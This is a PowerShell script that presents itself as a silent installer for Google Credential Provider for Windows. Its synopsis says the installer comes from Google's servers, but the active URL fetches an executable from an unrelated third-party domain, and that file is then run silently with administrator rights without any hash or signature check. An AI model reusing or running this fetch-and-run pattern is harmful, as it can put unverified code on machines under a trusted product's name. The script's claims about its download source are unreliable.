<#
.SYNOPSIS
    Downloads and silently installs Google Credential Provider for Windows (GCPW).
.DESCRIPTION
    This script downloads the GCPW MSI installer from Google's servers and installs it silently.
    Requires administrative privileges to run.
.NOTES
    File Name      : Install-GCPW.ps1
    Prerequisite   : PowerShell 5.1 or later
#>
[Console]::InputEncoding = [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$PSDefaultParameterValues['*:Encoding'] = 'utf8'
# Parameters
# $DownloadURL = "https://devops-vego.s3.us-east-1.amazonaws.com/gcpw/gcpwstandaloneenterprise64.exe"
$DownloadURL = "https://shiori.myxy.site/files/gcpwstandaloneenterprise64.exe"
$InstallerPath = "$env:TEMP\gcpwstandaloneenterprise64.exe"

# Check if running as administrator
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "This script requires administrator privileges. Please run PowerShell as administrator."
    exit 1
}

try {
    # Download the installer from S3
    Write-Host "Downloading GCPW installer from S3..."
    $ProgressPreference = 'SilentlyContinue'
    Invoke-WebRequest -Uri $DownloadURL -OutFile $InstallerPath -ErrorAction Stop
    $ProgressPreference = 'Continue'
    
    # Verify download
    if (Test-Path $InstallerPath) {
        Write-Host "Installer downloaded successfully to $InstallerPath"
        Write-Host "File size: $((Get-Item $InstallerPath).Length) bytes"
        
        # Install silently (no token parameter)
        Write-Host "Installing GCPW silently..."
        $process = Start-Process -FilePath $InstallerPath -ArgumentList "/silent", "/norestart" -Wait -PassThru
        
        # Check installation result
        if ($process.ExitCode -eq 0) {
            Write-Host "GCPW installed successfully."
            
            # Additional verification
            $serviceExists = Get-Service -Name "GCPWExtension" -ErrorAction SilentlyContinue
            if ($serviceExists) {
                Write-Host "GCPWExtension service is installed and running."
            }
        } else {
            Write-Warning "Installation completed with exit code: $($process.ExitCode)"
        }
    } else {
        Write-Error "Failed to download the installer."
    }
}
catch {
    Write-Error "An error occurred: $_"
}
finally {
    # Clean up - remove the installer
    if (Test-Path $InstallerPath) {
        try {
            Remove-Item $InstallerPath -Force -ErrorAction SilentlyContinue
            Write-Host "Temporary installer removed."
        }
        catch {
            Write-Warning "Failed to remove temporary installer: $_"
        }
    }
}

# Optional: Wait for user input to see results
Write-Host "Installation process completed."
pause